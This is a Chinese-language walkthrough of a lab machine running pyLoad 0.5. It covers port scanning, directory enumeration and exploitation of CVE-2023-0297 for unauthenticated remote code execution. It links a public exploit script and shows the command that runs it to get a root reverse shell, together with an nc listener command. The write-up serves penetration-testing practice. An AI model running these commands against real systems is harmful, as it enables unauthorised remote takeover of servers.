---
description: Easy - Linux / pyLoad 0.5 / RCE / CVE-2023-0297
---

# ✔️ pyLoader

## 建立立足点

### 信息收集&#x20;

* 使用Nmap对目标系统的开放端口进行扫描，获取到2个开放端口：22和9666

```bash
nmap -sC -sV -p- -oA pyloader 192.168.183.26 --open
```

<figure><img src="../../.gitbook/assets/1 (1).png" alt=""><figcaption></figcaption></figure>

* 枚举9666端口上的隐藏文件/目录，依次查看无收获：

```bash
dirsearch -u http://192.168.183.26:9666 -x 404,403,401,302,301,400
```

<figure><img src="../../.gitbook/assets/2 (35).png" alt=""><figcaption></figcaption></figure>

* 检查9666端口发现是一个登录界面，尝试几个弱口令均失败：

<figure><img src="../../.gitbook/assets/3 (32).png" alt=""><figcaption></figcaption></figure>

### 漏洞查阅

* 该页面直接显示了当前正在运行的程序是pyLoad，直接搜索发现唯一一个公开漏洞：CVE-2023-0297 未认证的 PyLoad <0.5.0b3.dev31 远程代码执行

<figure><img src="../../.gitbook/assets/4 (33).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/5 (33).png" alt=""><figcaption></figcaption></figure>

* Exploit： https://github.com/JacobEbben/CVE-2023-0297/blob/main/exploit.py

<figure><img src="../../.gitbook/assets/6 (33).png" alt=""><figcaption></figcaption></figure>

### ROOT

* 直接利用该脚本即可获取到拥有root权限的反弹shell：

```bash
python3 exploit.py -t http://192.168.183.26:9666 -I 192.168.45.179 -P 4444
# 监听：
nc -lvnp 4444
```

<figure><img src="../../.gitbook/assets/7 (33).png" alt=""><figcaption></figcaption></figure>
